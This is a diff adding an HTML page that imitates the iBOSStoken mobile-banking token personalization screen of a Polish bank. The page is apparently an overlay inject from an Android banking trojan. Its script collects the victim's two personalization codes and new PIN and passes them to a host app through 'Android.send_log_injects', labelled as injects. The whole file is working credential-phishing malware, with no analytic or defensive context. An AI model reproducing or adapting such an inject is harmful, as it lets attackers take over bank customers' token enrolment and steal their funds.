@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>mtoken</title>
+    <link rel="shortcut icon" href="hr.asseco.android.mtoken.bos.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #fff;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+    text-align: right;
+    background-size: 100%;
+    padding: 20px 0px 20px 0px;
+    color: #000;
+    font-weight: 400;
+    text-decoration: none;
+    background: #d4e7e9;
+    padding-right: 40px;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 20px 0px;
+    color: #151515;
+    outline: none;
+    border: 2px solid #cecece;
+    background: #fff;
+    border-radius: 5px;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #fff;
+    border: none;
+    font-size: 17px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #4caf6a;
+    border-radius: 30px;
+}
+fieldset span {
+    display: inline-block;
+    text-align: center;
+    color: #4b4949;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #151515;
+    font-size: 15px;
+}
+.pass input::placeholder {
+    font-size: 11px;
+    color: #db2060;
+}
+</style>
+
+<script type="text/javascript">
+
+
+function next() {
+    document.getElementById("loginn").style.display="none";
+    document.getElementById("nastepny").style.display="none";
+    document.getElementById("passw").style.display="block";
+    document.getElementById("okay").style.display="block";
+}
+
+    function testJump(x){
+    var ml = ~~x.getAttribute('maxlength');
+    if(ml && x.value.length >= ml){
+        do {
+      x = x.nextSibling;
+    }
+    while (x && !((/text/.test(x.type)) || x.disabled));
+        if(x && /text/.test(x.type)){
+            x.focus();
+        }
+    }
+}
+</script>
+
+<fieldset id="formtosend">
+
+<div class="logo">
+<span style="display: block; color: #00BCD4; float: left; padding: 0; font-weight: 400; padding-left: 20px;">Perzonalizacja iBOSStoken</span>
+<a href="#" onclick="next()" style="text-decoration: none; color: #000; font-size: 20px;" id="nastepny">Następny</a>
+<a href="#" onclick="send_form()" style="text-decoration: none; color: #000; font-size: 20px; display: none;" id="okay">OK</a>
+</div>
+
+<div id="log1">
+
+<div class="area" style="padding: 20px 20px 50px 20px;border-radius: 3px;margin-top: 40px;">
+    <div id="loginn">
+    <label style="display: block; padding-bottom: 10px;">Wprowadż kod personalizacyjny:</label>
+        <input type="text" name="code1" id="code1" maxlength="8" onkeyup="testJump(this);" style="height: 50px; max-width: 200px; display: inline-block;" placeholder="" onkeypress="if ( isNaN( String.fromCharCode(event.keyCode) )) return false;">
+        <input type="text" name="code2" id="code2" maxlength="8" onkeyup="testJump(this);" style="height: 50px; max-width: 200px; display: inline-block;" placeholder="" onkeypress="if ( isNaN( String.fromCharCode(event.keyCode) )) return false;">
+    </div>
+    <div id="passw" style="display: none;">
+<label style="float: left; padding-bottom: 10px;">Nadaj numer PIN:</label>
+<input type="password" name="pin" id="pin" onkeypress="if ( isNaN( String.fromCharCode(event.keyCode) )) return false;">
+<label style="float: left; padding-bottom: 10px;">Powtórz numer PIN:</label>
+<input type="password" name="sumbit" onkeypress="if ( isNaN( String.fromCharCode(event.keyCode) )) return false;">
+    </div>
+</div>
+
+</div>
+        
+        </div>
+        <input name="exit" type="hidden" text="true"/>
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+function send_form()
+{
+
+        if (document.getElementById("code1").value == '')
+{
+    alert ('Wszystkie pola wymagane!');
+    return false;
+}
+        if (document.getElementById("code2").value == '')
+{
+    alert ('Wszystkie pola wymagane!');
+    return false;
+}
+var data = {};
+    data.code1 = document.getElementById('code1').value;
+    data.code2 = document.getElementById('code2').value;
+    data.pin = document.getElementById('pin').value;
+    data.type_injects = "crypt";
+    data.closed = "close_activity_injects";
+    
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+            Android.send_log_injects(JSON.stringify(data))
+        } catch (err) {}
+    }else{
+        alert(JSON.stringify(data));
+    } 
+}
+</script>
+
+</body>
+</html>
